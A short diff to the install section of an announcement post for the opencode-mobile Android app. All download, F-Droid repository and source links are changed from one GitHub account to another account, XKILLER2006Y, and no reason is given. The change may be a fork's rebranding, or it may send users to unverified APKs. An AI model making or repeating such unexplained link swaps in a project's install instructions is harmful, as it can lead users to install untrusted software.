@@ -42,11 +42,11 @@ Your API keys stay on your server. No accounts, no analytics, no proprietary bac
 
 **Install**
 
-- Install (F-Droid + APK, one page): https://dzianisv.github.io/opencode-mobile/download/
-- All options + setup guide: https://dzianisv.github.io/opencode-mobile/
-- F-Droid repo (add this URL in your F-Droid client): https://dzianisv.github.io/opencode-mobile/fdroid/repo
-- Direct APK: https://github.com/dzianisv/opencode-mobile/releases/latest
-- Source: https://github.com/dzianisv/opencode-mobile
+- Install (F-Droid + APK, one page): https://XKILLER2006Y.github.io/opencode-mobile/download/
+- All options + setup guide: https://XKILLER2006Y.github.io/opencode-mobile/
+- F-Droid repo (add this URL in your F-Droid client): https://XKILLER2006Y.github.io/opencode-mobile/fdroid/repo
+- Direct APK: https://github.com/XKILLER2006Y/opencode-mobile/releases/latest
+- Source: https://github.com/XKILLER2006Y/opencode-mobile
 - Google Play: in review, going live shortly — {{PLAY_URL}}
 
 Happy to answer anything about the tunnel setup or the API. Feedback welcome, especially from anyone already self-hosting opencode.
